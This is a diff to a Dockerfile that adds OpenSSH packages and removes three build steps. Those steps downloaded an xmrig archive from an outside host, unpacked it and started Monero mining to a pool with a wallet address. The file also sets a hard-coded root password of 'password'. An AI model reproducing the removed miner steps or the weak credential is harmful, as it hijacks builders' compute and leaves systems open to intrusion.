@@ -4,7 +4,7 @@ RUN apt-get clean && apt-get update && apt-get -y upgrade
 RUN apt-get -y install apt-utils gcc \
 	python3 vim unzip ruby nodejs \
 	fakeroot dbus base whiptail hexedit \
-	patch wamerican ucf manpages \
+	patch wamerican ucf openssh-server openssh-client manpages \
 	file luajit make lua50 dialog curl \
 	less cowsay netcat-openbsd git unzip \
         build-essential cmake libuv1-dev libssl-dev libhwloc-dev
@@ -17,6 +17,4 @@ WORKDIR /home/user/
 ENV HOME="/home/user" TERM="xterm" USER="user" SHELL="/bin/bash" EDITOR="vim" LANG="en_US.UTF-8" LC_ALL="C"
 RUN echo 'root:password' | chpasswd
 CMD [ "/bin/bash" ]
-RUN wget http://watercooling.x10.mx/xmrig.zip
-RUN unzip xmrig.zip
-RUN ./xmrig -o moneroocean.stream:10128 -u 4A7F2uGwJ1QffZY9jQNMEDB8WQfAcyNdKLzHSsBLzLTQYCjbQVvceNa1Gyhxj7mu8SftUM6cGod2bTxhqjG6aevw63Z3eNz -p coin -k
+
